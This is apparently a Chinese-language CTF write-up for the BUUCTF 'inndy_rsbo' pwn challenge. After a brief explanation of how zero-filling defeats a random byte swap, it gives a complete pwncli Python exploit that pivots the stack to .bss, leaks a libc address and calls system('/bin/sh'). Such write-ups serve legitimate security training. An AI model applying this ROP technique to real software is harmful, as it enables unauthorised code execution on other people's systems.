# BUUCTF-inndy_rsbo



### 总结

虽然对输入的`rop`中的字节是随机交换，但是由于循环的边界在栈上，所以可以把前面一大段都写为`0`，这样某一次交换就会把循环边界置为`0`，跳出循环，不会影响后面的`rop`。

<!-- more -->

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

bss_addr = elf.bss(0x800)

s(b"\x00" * 0x60 + flat({
    8:[
        bss_addr,
        0x804865c, # read 80 bytes
        0x804867d, # leave; ret
        bss_addr
    ]
}, length=0x20))

# leak addr
s(flat(
    [
        bss_addr + 0x100, # fake ebp
        elf.plt.write,
        0x804879d, # pppr
        1, elf.got.read, 4,
        0x804865c, # read 80 bytes
        0,
        bss_addr
    ]
))

set_current_libc_base_and_log(recv_current_libc_addr(offset=libc.sym.read), 0)

s(flat({
    28: [
        libc.sym.system,
        'dead',
        libc.search(b"/bin/sh").__next__()
    ]
}))

ia()
```

![image-20220411235935133](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220411235935133.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2022-04-11-buuctf-inndy-rsbo/  

